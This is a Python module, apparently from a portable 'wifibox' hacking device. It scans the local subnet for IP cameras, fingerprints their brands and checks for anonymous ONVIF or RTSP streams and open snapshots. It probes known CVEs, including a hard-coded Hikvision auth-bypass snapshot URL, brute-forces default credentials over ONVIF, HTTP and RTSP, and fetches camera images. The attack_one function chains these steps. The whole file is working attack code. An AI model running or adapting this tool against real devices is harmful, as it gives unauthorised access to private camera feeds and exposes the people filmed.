# -*- coding: utf-8 -*-
"""IP-camera discovery + credential/unauth/vuln engine (pure stdlib).

Read-only by design: discovery (subnet + threaded TCP port scan), brand
fingerprinting (HTTP banner / ONVIF / RTSP), unauthenticated-access checks,
brand-aware default-credential brute force, and known-vulnerability
access/bypass/credential-disclosure probes. No RCE, no writes to the device.

Everything is a plain function returning dicts — no stdout scraping.
"""
import base64
import hashlib
import ipaddress
import os
import re
import socket
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import config
from attack import camera_creds, camera_vulns

IP = "/usr/sbin/ip"


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
def _log(msg):
    try:
        with open(config.LOG_FILE, "a") as f:
            f.write("[cam] %s\n" % msg)
    except Exception:  # noqa: BLE001
        pass


# ---------------------------------------------------------------------------
# Subnet discovery
# ---------------------------------------------------------------------------
def _run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout)
    except Exception:  # noqa: BLE001
        return None


def _ipv4s(ifname=None):
    """Local non-loopback IPv4 (ip, prefix) pairs from `ip addr`."""
    out = _run([IP, "-o", "-4", "addr", "show"])
    if not out:
        return []
    res = []
    for line in out.stdout.splitlines():
        parts = line.split()
        if len(parts) < 4 or "inet" not in parts:
            continue
        name = parts[1]
        if ifname and name != ifname:
            continue
        cidr = parts[3]
        ip, _, prefix = cidr.partition("/")
        if ip.startswith("127.") or ip.startswith("169.254."):
            continue
        res.append((name, ip, int(prefix or "24")))
    return res


def get_subnet(ifname=None):
    """Return (interface, ip, prefix) of the connected interface, preferring the
    internal wifi (wl0). Scans always collapse to the /24 around that IP."""
    addrs = _ipv4s(ifname)
    if ifname is None:
        addrs = sorted(addrs, key=lambda a: a[0] != config.INTERNAL_NAME)
    if not addrs:
        return None
    name, ip, prefix = addrs[0]
    return {"iface": name, "ip": ip, "prefix": prefix}


def subnet_hosts(info, cap=254):
    """Expand the /24 containing `ip` into host strings (skip network, self)."""
    if not info:
        return []
    ip = ipaddress.ip_address(info["ip"])
    net = ipaddress.ip_network("%s/24" % ip, strict=False)
    hosts = [str(h) for h in net.hosts() if str(h) != info["ip"]]
    return hosts[:cap]


# ---------------------------------------------------------------------------
# Raw HTTP (socket, so we can read 401 challenges and banners)
# ---------------------------------------------------------------------------
def _http(host, port, method="GET", path="/", headers=None, body=None,
          timeout=None, max_read=65536):
    timeout = timeout or config.CAMERA_HTTP_TIMEOUT
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        hdrs = {"Host": host, "User-Agent": "wifibox/2.0",
                "Connection": "close", "Accept": "*/*"}
        hdrs.update(headers or {})
        if body:
            hdrs["Content-Length"] = str(len(body))
        lines = ["%s %s HTTP/1.1" % (method, path)]
        lines += ["%s: %s" % (k, v) for k, v in hdrs.items()]
        req = ("\r\n".join(lines) + "\r\n\r\n").encode()
        if body:
            req += body if isinstance(body, bytes) else body.encode()
        sock.sendall(req)
        data = b""
        while len(data) < max_read:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        if not data:
            return None
        head, _, rest = data.partition(b"\r\n\r\n")
        if not rest:
            return None
        status = head.split(b"\r\n", 1)[0].decode(errors="replace")
        hdrs_out = {}
        for ln in head.split(b"\r\n")[1:]:
            if b":" in ln:
                k, v = ln.split(b":", 1)
                hdrs_out[k.decode().strip().lower()] = v.decode().strip()
        return {"status": status, "code": int(status.split(" ")[1]),
                "headers": hdrs_out, "body": rest}
    except Exception:  # noqa: BLE001
        return None
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Digest auth (shared by HTTP + RTSP)
# ---------------------------------------------------------------------------
def _parse_auth_params(header):
    """Parse `Digest realm="x", nonce="y", qop="auth", ...` -> dict."""
    params = {}
    for m in re.finditer(r'(\w+)=("([^"]*)"|([^,\s]+))', header or ""):
        params[m.group(1).lower()] = m.group(3) if m.group(3) is not None \
            else m.group(4)
    return params


def _digest_response(method, uri, challenge, user, pw, nc="00000001"):
    p = _parse_auth_params(challenge)
    realm = p.get("realm", "")
    nonce = p.get("nonce", "")
    qop = p.get("qop")
    algorithm = p.get("algorithm", "MD5").upper()
    opaque = p.get("opaque")
    cnonce = base64.b64encode(os.urandom(8)).decode().rstrip("=")

    def _h(s):
        if algorithm == "MD5-SESS":
            return hashlib.md5(s.encode()).hexdigest()
        return hashlib.md5(s.encode()).hexdigest()

    ha1 = _h("%s:%s:%s" % (user, realm, pw))
    if algorithm == "MD5-SESS":
        ha1 = _h("%s:%s:%s" % (ha1, nonce, cnonce))
    ha2 = _h("%s:%s" % (method, uri))
    if qop:
        digest = _h("%s:%s:%s:%s:%s:%s" % (ha1, nonce, nc, cnonce, qop, ha2))
    else:
        digest = _h("%s:%s:%s" % (ha1, nonce, ha2))

    parts = ['username="%s"' % user, 'realm="%s"' % realm,
             'nonce="%s"' % nonce, 'uri="%s"' % uri, 'response="%s"' % digest]
    if algorithm and algorithm != "MD5":
        parts.append('algorithm=%s' % algorithm)
    if opaque:
        parts.append('opaque="%s"' % opaque)
    if qop:
        parts.append('qop=%s' % qop)
        parts.append('nc=%s' % nc)
        parts.append('cnonce="%s"' % cnonce)
    return "Digest " + ", ".join(parts)


def _basic_auth(user, pw):
    token = base64.b64encode(("%s:%s" % (user, pw)).encode()).decode()
    return "Basic " + token


# ---------------------------------------------------------------------------
# ONVIF (WS-Security UsernameToken)
# ---------------------------------------------------------------------------
def _soap_digest(nonce_b64, created, pw):
    raw = base64.b64decode(nonce_b64) + created.encode() + pw.encode()
    return base64.b64encode(hashlib.sha1(raw).digest()).decode()


def _soap(service_action, body_xml, creds=None):
    """Build a SOAP 1.2 envelope with optional WS-Security UsernameToken."""
    created = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    nonce = base64.b64encode(os.urandom(16)).decode()
    sec = ""
    if creds:
        user, pw = creds
        digest = _soap_digest(nonce, created, pw or "")
        sec = (
            '<s:Header><Security s:mustUnderstand="1" '
            'xmlns="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-secext-1.0.xsd">'
            '<UsernameToken><Username>%s</Username>'
            '<Password Type="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-username-token-profile-1.0#PasswordDigest">%s'
            '</Password><Nonce EncodingType="http://docs.oasis-open.org/wss/'
            '2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">'
            '%s</Nonce><Created xmlns="http://docs.oasis-open.org/wss/2004/01/'
            'oasis-200401-wss-wssecurity-utility-1.0.xsd">%s</Created>'
            '</UsernameToken></Security></s:Header>'
            % (user, digest, nonce, created))
    return (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
        '%s<s:Body>%s</s:Body></s:Envelope>' % (sec, body_xml)
    )


def onvif_req(ip, port, action, body_xml, creds=None, path="/onvif/device_service",
              timeout=None):
    """POST a SOAP request; returns (ok, body_text)."""
    soap = _soap(action, body_xml, creds=creds)
    headers = {"Content-Type": "application/soap+xml; charset=utf-8",
               "SOAPAction": action}
    r = _http(ip, port, "POST", path, headers=headers, body=soap.encode(),
              max_read=131072, timeout=timeout)
    if not r:
        return False, ""
    body = r["body"].decode(errors="replace")
    ok = r["code"] == 200 and "Fault" not in body[:2000] and \
        not re.search(r"<faultstring[^>]*>", body)
    return ok, body


def _xml_val(xml, tag):
    m = re.search(r"<%s[^>]*>(.*?)</%s>" % (tag, tag), xml, re.S)
    return m.group(1).strip() if m else ""


# ---------------------------------------------------------------------------
# RTSP
# ---------------------------------------------------------------------------
def _rtsp(host, port, method="OPTIONS", uri=None, auth=None, timeout=5):
    uri = uri or "rtsp://%s:%d/" % (host, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        lines = ["%s %s RTSP/1.0" % (method, uri), "CSeq: 1",
                 "User-Agent: wifibox/2.0"]
        if auth:
            lines.append("Authorization: " + auth)
        sock.sendall(("\r\n".join(lines) + "\r\n\r\n").encode())
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
            if len(data) > 8192:
                break
        if not data:
            return None
        head = data.partition(b"\r\n\r\n")[0].decode(errors="replace")
        status = head.split("\r\n", 1)[0]
        hdrs = {}
        for ln in head.split("\r\n")[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                hdrs[k.strip().lower()] = v.strip()
        code = int(status.split(" ")[1]) if len(status.split(" ")) > 1 else 0
        return {"code": code, "headers": hdrs, "status": status}
    except Exception:  # noqa: BLE001
        return None
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Port scan
# ---------------------------------------------------------------------------
def _port_open(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(config.CAMERA_SCAN_TIMEOUT)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:  # noqa: BLE001
        return False
    finally:
        s.close()


def scan_ports(hosts, ports=None, stop_flag=None, progress_cb=None):
    """Threaded TCP connect scan. Returns {ip: [open_ports]}."""
    ports = ports or config.CAMERA_PORTS
    results = {}
    lock = threading.Lock()
    done = {"n": 0}

    def probe(args):
        ip, port = args
        if stop_flag and stop_flag.is_set():
            return
        if _port_open(ip, port):
            with lock:
                results.setdefault(ip, []).append(port)
        with lock:
            done["n"] += 1
            if progress_cb and done["n"] % 64 == 0:
                progress_cb(done["n"], len(hosts) * len(ports), len(results))

    with ThreadPoolExecutor(max_workers=config.CAMERA_MAX_THREADS) as ex:
        ex.map(probe, [(ip, p) for ip in hosts for p in ports])
    if progress_cb:
        progress_cb(done["n"], len(hosts) * len(ports), len(results))
    return {ip: sorted(ps) for ip, ps in results.items()}


# ---------------------------------------------------------------------------
# Fingerprinting
# ---------------------------------------------------------------------------
_BRAND_SIG = [
    ("hikvision", ["hikvision", "hi3516", "isapi", "ezviz"]),
    ("dahua", ["dahua", "imou", "dh_ipc"]),
    ("xiaomi", ["xiaomi", "chuangmi", "mijia", "mi home"]),
    ("tapo", ["tp-link", "tapo", "kasa"]),
    ("vstarcam", ["vstarcam", "vstar", "ipc_vs"]),
    ("tenda", ["tenda", "cp3"]),
    ("xiongmai", ["xmeye", "xiongmai", "yoosee", "v380", "goke", "hi3518",
                  "general", "nvr", "h.264 video", "onvif"]),
]

# Generic camera-hint words for hosts whose banner carries no brand string.
_CAM_WORDS = ["camera", "ipcam", "ip cam", "webcam", "cctv", "dvr", "nvr",
              "mpeg", "h.264", "onvif", "rtsp", "surveillance"]


def _match_brand(text):
    t = (text or "").lower()
    for brand, sigs in _BRAND_SIG:
        for s in sigs:
            if s in t:
                return brand
    return None


def _cameraish(blob):
    t = (blob or "").lower()
    if _match_brand(t):
        return True
    return any(w in t for w in _CAM_WORDS)


def _fingerprint_http(ip, port):
    r = _http(ip, port, "GET", "/", timeout=2.5)
    if not r:
        return {}
    info = {"http_ports": [port]}
    server = r["headers"].get("server", "")
    wwwauth = r["headers"].get("www-authenticate", "")
    body = r["body"][:2048].decode(errors="replace").lower()
    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.S)
    if m:
        title = m.group(1).strip()
    hay = " ".join([server, wwwauth, title, body])
    brand = _match_brand(hay)
    return {"http_ports": [port], "server": server, "title": title,
            "www_auth": wwwauth[:120], "brand": brand, "blob": hay[:512]}


def _fingerprint_onvif(ip, port):
    ok, body = onvif_req(ip, port,
                         "http://www.onvif.org/ver10/device/wsdl/"
                         "GetDeviceInformation",
                         '<GetDeviceInformation '
                         'xmlns="http://www.onvif.org/ver10/device/wsdl"/>',
                         timeout=2.5)
    if not ok:
        return {}
    manufacturer = _xml_val(body, "Manufacturer")
    model = _xml_val(body, "Model")
    fw = _xml_val(body, "FirmwareVersion")
    brand = _match_brand(" ".join([manufacturer, model]))
    return {"onvif_port": port, "manufacturer": manufacturer, "model": model,
            "firmware": fw, "brand": brand,
            "blob": ("%s %s %s" % (manufacturer, model, fw)).lower()}


def _fingerprint_rtsp(ip, port):
    r = _rtsp(ip, port, "OPTIONS", timeout=2.5)
    if not r:
        return {}
    server = r["headers"].get("server", "")
    brand = _match_brand(server)
    return {"rtsp_port": port, "rtsp_server": server, "brand": brand,
            "rtsp_open": r["code"] == 200, "blob": server.lower()}


def fingerprint(ip, ports):
    """Identify a camera host. Returns {brand, model, ...} or None if the host
    shows no camera-like signal (HTTP banner/ONVIF/RTSP)."""
    fp = {"ip": ip, "ports": ports, "http_ports": [], "brand": None}
    blob_parts = []
    http_sig = False
    for p in ports:
        if p in (80, 8000, 8080, 8899, 37777, 34567, 5000, 9000, 10080, 1024):
            h = _fingerprint_http(ip, p)
            if h:
                fp["http_ports"].extend(h.get("http_ports", []))
                for k in ("server", "title", "www_auth"):
                    if h.get(k):
                        fp[k] = h[k]
                blob_parts.append(h.get("blob", ""))
                if _cameraish(h.get("blob", "")):
                    http_sig = True
                if h.get("brand") and not fp["brand"]:
                    fp["brand"] = h["brand"]
        if p == 554:
            r = _fingerprint_rtsp(ip, p)
            if r:
                for k in ("rtsp_server", "rtsp_open"):
                    if r.get(k) is not None:
                        fp[k] = r[k]
                if r.get("rtsp_port"):
                    fp["rtsp_port"] = r["rtsp_port"]
                blob_parts.append(r.get("blob", ""))
                if r.get("brand") and not fp["brand"]:
                    fp["brand"] = r["brand"]
    for p in ports:
        if p in (80, 8000, 8080, 8899, 5000):
            o = _fingerprint_onvif(ip, p)
            if o:
                for k in ("manufacturer", "model", "firmware"):
                    if o.get(k):
                        fp[k] = o[k]
                if o.get("onvif_port"):
                    fp["onvif_port"] = o["onvif_port"]
                blob_parts.append(o.get("blob", ""))
                if o.get("brand") and not fp["brand"]:
                    fp["brand"] = o["brand"]
    if not fp["brand"]:
        fp["brand"] = _match_brand(" ".join(blob_parts))
    # A camera must show ONVIF, RTSP, or a camera-ish HTTP banner — a plain
    # web server (router/NAS/printer) doesn't count.
    if not (fp.get("onvif_port") or fp.get("rtsp_port") or http_sig):
        return None
    if not fp["brand"]:
        fp["brand"] = "xiongmai"   # dominant cheap-cam platform as the default
    return fp


# ---------------------------------------------------------------------------
# Unauthenticated access
# ---------------------------------------------------------------------------
def _snapshot_urls(fp):
    brand = fp.get("brand")
    ip = fp["ip"]
    urls = []
    port = fp.get("http_ports", [80])[0]
    if brand == "hikvision":
        urls.append("http://%s:%d/onvif-http/snapshot?auth=YWRtaW46MTEK"
                    % (ip, port))
    if brand == "dahua":
        urls.append("http://%s:%d/cgi-bin/snapshot.cgi" % (ip, port))
    urls += ["http://%s:%d/snapshot.jpg" % (ip, port),
             "http://%s:%d/onvif-http/snapshot" % (ip, port)]
    return urls


def check_unauth(ip, fp):
    """Look for password-less access: anonymous ONVIF stream URI or an open
    snapshot endpoint. Returns {ok, kind, detail, stream_uri, snapshot_url}."""
    # Anonymous ONVIF: list profiles, then get a stream URI.
    if fp.get("onvif_port"):
        ok, body = onvif_req(ip, fp["onvif_port"],
                             "http://www.onvif.org/ver10/media/wsdl/GetProfiles",
                             '<GetProfiles xmlns="http://www.onvif.org/ver10/'
                             'media/wsdl"/>')
        if ok:
            tok = _xml_val(body, "token") or _xml_val(body, "ProfileToken")
            if tok:
                uri_xml = (
                    '<GetStreamUri xmlns="http://www.onvif.org/ver10/'
                    'media/wsdl"><StreamSetup>'
                    '<Stream xmlns="http://www.onvif.org/ver10/schema">'
                    'RTP-Unicast</Stream>'
                    '<Transport xmlns="http://www.onvif.org/ver10/schema">'
                    '<Protocol>RTSP</Protocol></Transport></StreamSetup>'
                    '<ProfileToken>%s</ProfileToken></GetStreamUri>' % tok)
                ok2, body2 = onvif_req(ip, fp["onvif_port"],
                                       "http://www.onvif.org/ver10/media/wsdl/"
                                       "GetStreamUri", uri_xml)
                if ok2:
                    uri = _xml_val(body2, "Uri")
                    if uri:
                        return {"ok": True, "kind": "stream",
                                "detail": "ONVIF anonymous", "stream_uri": uri}
    # Open RTSP stream.
    if fp.get("rtsp_port"):
        r = _rtsp(ip, fp["rtsp_port"], "DESCRIBE")
        if r and r["code"] == 200:
            return {"ok": True, "kind": "stream", "detail": "RTSP no-auth",
                    "stream_uri": "rtsp://%s:%d/" % (ip, fp["rtsp_port"])}
    # Open snapshot.
    for url in _snapshot_urls(fp):
        m = re.match(r"http://([^:/]+):(\d+)(/.*)", url)
        if not m:
            continue
        r = _http(m.group(1), int(m.group(2)), "GET", m.group(3))
        if r and r["code"] == 200 and r["body"][:3] == b"\xff\xd8\xff":
            return {"ok": True, "kind": "snapshot", "detail": "open snapshot",
                    "snapshot_url": url}
    return {"ok": False}


# ---------------------------------------------------------------------------
# Vulnerability probes (read-only)
# ---------------------------------------------------------------------------
def run_vulns(ip, fp, stop_flag=None):
    out = []
    port = fp.get("http_ports", [80])[0]
    for probe in camera_vulns.probes_for(fp.get("brand")):
        if stop_flag and stop_flag.is_set():
            break
        r = _http(ip, port, probe["method"], probe["path"])
        if not r:
            continue
        match = probe.get("match")
        body = r["body"]
        if match == "jpeg":
            ok = r["code"] == 200 and body[:3] == b"\xff\xd8\xff"
        elif match:
            ok = r["code"] == 200 and match in body.decode(errors="replace")
        else:
            ok = r["code"] == 200 and len(body) > 0
        if ok:
            out.append({"name": probe["name"], "cve": probe["cve"],
                        "kind": probe["kind"], "ok": True, "body": body})
    return out


# ---------------------------------------------------------------------------
# Credential brute force
# ---------------------------------------------------------------------------
def _try_http_auth(ip, port, user, pw):
    """Try Basic then Digest auth against the web root. Returns True/False."""
    r = _http(ip, port, "GET", "/")
    if not r or r["code"] != 401:
        return r is not None and r["code"] in (200, 301, 302)
    chal = r["headers"].get("www-authenticate", "")
    if chal.lower().startswith("basic"):
        auth = _basic_auth(user, pw)
    elif chal.lower().startswith("digest"):
        auth = _digest_response("GET", "/", chal, user, pw)
    else:
        return False
    r2 = _http(ip, port, "GET", "/", headers={"Authorization": auth})
    return r2 is not None and r2["code"] in (200, 301, 302)


def _try_onvif_auth(ip, onvif_port, user, pw):
    ok, _ = onvif_req(ip, onvif_port,
                      "http://www.onvif.org/ver10/device/wsdl/GetSystemDateAndTime",
                      '<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/'
                      'device/wsdl"/>', creds=(user, pw))
    return ok


def _try_rtsp_auth(ip, rtsp_port, user, pw):
    r = _rtsp(ip, rtsp_port, "DESCRIBE")
    if not r:
        return False
    if r["code"] == 200:
        return True
    chal = r["headers"].get("www-authenticate", "")
    if not chal:
        return False
    uri = "rtsp://%s:%d/" % (ip, rtsp_port)
    if chal.lower().startswith("basic"):
        auth = _basic_auth(user, pw)
    else:
        auth = _digest_response("DESCRIBE", uri, chal, user, pw)
    r2 = _rtsp(ip, rtsp_port, "DESCRIBE", auth=auth)
    return r2 is not None and r2["code"] == 200


def brute(ip, fp, stop_flag=None, progress_cb=None):
    """Try brand-aware creds via ONVIF, then HTTP, then RTSP. Returns
    {ok, user, pass, stream_uri} or {ok: False}."""
    creds = camera_creds.creds_for(fp.get("brand"))
    onvif_port = fp.get("onvif_port")
    http_port = fp.get("http_ports", [80])[0]
    rtsp_port = fp.get("rtsp_port")
    for i, (user, pw) in enumerate(creds):
        if stop_flag and stop_flag.is_set():
            return {"ok": False, "cancelled": True}
        if progress_cb:
            progress_cb(i + 1, len(creds), "%s/%s" % (user, pw or "-"))
        if onvif_port and _try_onvif_auth(ip, onvif_port, user, pw):
            stream = _stream_uri_onvif(ip, onvif_port, user, pw)
            return {"ok": True, "user": user, "pass": pw, "stream_uri": stream}
        if http_port and _try_http_auth(ip, http_port, user, pw):
            return {"ok": True, "user": user, "pass": pw}
        if rtsp_port and _try_rtsp_auth(ip, rtsp_port, user, pw):
            return {"ok": True, "user": user, "pass": pw,
                    "stream_uri": "rtsp://%s:%d/" % (ip, rtsp_port)}
    return {"ok": False}


def _stream_uri_onvif(ip, port, user, pw):
    ok, body = onvif_req(ip, port,
                         "http://www.onvif.org/ver10/media/wsdl/GetProfiles",
                         '<GetProfiles xmlns="http://www.onvif.org/ver10/'
                         'media/wsdl"/>', creds=(user, pw))
    if not ok:
        return None
    tok = _xml_val(body, "token") or _xml_val(body, "ProfileToken")
    if not tok:
        return None
    uri_xml = (
        '<GetStreamUri xmlns="http://www.onvif.org/ver10/media/wsdl">'
        '<StreamSetup><Stream xmlns="http://www.onvif.org/ver10/schema">'
        'RTP-Unicast</Stream>'
        '<Transport xmlns="http://www.onvif.org/ver10/schema">'
        '<Protocol>RTSP</Protocol></Transport></StreamSetup>'
        '<ProfileToken>%s</ProfileToken></GetStreamUri>' % tok)
    ok2, body2 = onvif_req(ip, port,
                           "http://www.onvif.org/ver10/media/wsdl/GetStreamUri",
                           uri_xml, creds=(user, pw))
    if not ok2:
        return None
    return _xml_val(body2, "Uri") or None


# ---------------------------------------------------------------------------
# Snapshot fetch + decode
# ---------------------------------------------------------------------------
def fetch_snapshot(ip, fp, creds=None):
    """Grab a JPEG snapshot, optionally with credentials (basic/digest)."""
    port = fp.get("http_ports", [80])[0]
    for url in _snapshot_urls(fp):
        m = re.match(r"http://([^:/]+):(\d+)(/.*)", url)
        if not m:
            continue
        host, p, path = m.group(1), int(m.group(2)), m.group(3)
        r = _http(host, p, "GET", path, max_read=4194304)
        if r and r["code"] == 200 and r["body"][:3] == b"\xff\xd8\xff":
            return {"ok": True, "data": r["body"], "url": url}
        if creds and r and r["code"] == 401:
            user, pw = creds
            chal = r["headers"].get("www-authenticate", "")
            if chal.lower().startswith("basic"):
                auth = _basic_auth(user, pw)
            elif chal.lower().startswith("digest"):
                auth = _digest_response("GET", path, chal, user, pw)
            else:
                auth = _basic_auth(user, pw)
            r2 = _http(host, p, "GET", path,
                       headers={"Authorization": auth}, max_read=4194304)
            if r2 and r2["code"] == 200 and r2["body"][:3] == b"\xff\xd8\xff":
                return {"ok": True, "data": r2["body"], "url": url}
    return {"ok": False}


def decode_snapshot(data):
    """Decode JPEG bytes into a 128x128 RGB PIL image (aspect-preserving
    letterbox on the theme background). Returns an Image or None."""
    try:
        from io import BytesIO
        from PIL import Image
        img = Image.open(BytesIO(data)).convert("RGB")
        img.thumbnail((config.WIDTH, config.HEIGHT), Image.LANCZOS)
        canvas = Image.new("RGB", (config.WIDTH, config.HEIGHT),
                           (30, 30, 30))
        x = (config.WIDTH - img.width) // 2
        y = (config.HEIGHT - img.height) // 2
        canvas.paste(img, (x, y))
        return canvas
    except Exception:  # noqa: BLE001
        return None


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------
def discover(ifname=None, stop_flag=None, progress_cb=None):
    """Subnet -> port scan -> fingerprint. Returns {ok, subnet, cameras}."""
    info = get_subnet(ifname)
    if not info:
        return {"ok": False, "error": "no network", "cameras": []}
    hosts = subnet_hosts(info)
    open_map = scan_ports(hosts, stop_flag=stop_flag, progress_cb=progress_cb)
    cameras = []
    for ip, ports in open_map.items():
        if stop_flag and stop_flag.is_set():
            break
        fp = fingerprint(ip, ports)
        if fp:
            cameras.append(fp)
    return {"ok": True, "subnet": info, "cameras": cameras}


def attack_one(ip, fp, stop_flag=None, progress_cb=None):
    """Unauth -> vulns -> brute for a single camera. Returns a result dict."""
    result = {"ip": ip, "brand": fp.get("brand"), "model": fp.get("model"),
              "access": None, "creds": None, "vulns": [], "snapshot": None}
    u = check_unauth(ip, fp)
    if u.get("ok"):
        result["access"] = u
        if u.get("kind") == "stream":
            result["stream_uri"] = u.get("stream_uri")
    elif not stop_flag:
        result["vulns"] = run_vulns(ip, fp, stop_flag=stop_flag)
        snap_vuln = next((v for v in result["vulns"]
                          if v["kind"] == "snapshot"), None)
        if snap_vuln:
            result["access"] = {"ok": True, "kind": "snapshot",
                                "detail": snap_vuln["name"]}
    if not result.get("access"):
        b = brute(ip, fp, stop_flag=stop_flag, progress_cb=progress_cb)
        if b.get("ok"):
            result["creds"] = {"user": b["user"], "pass": b["pass"]}
            result["stream_uri"] = b.get("stream_uri")
    return result
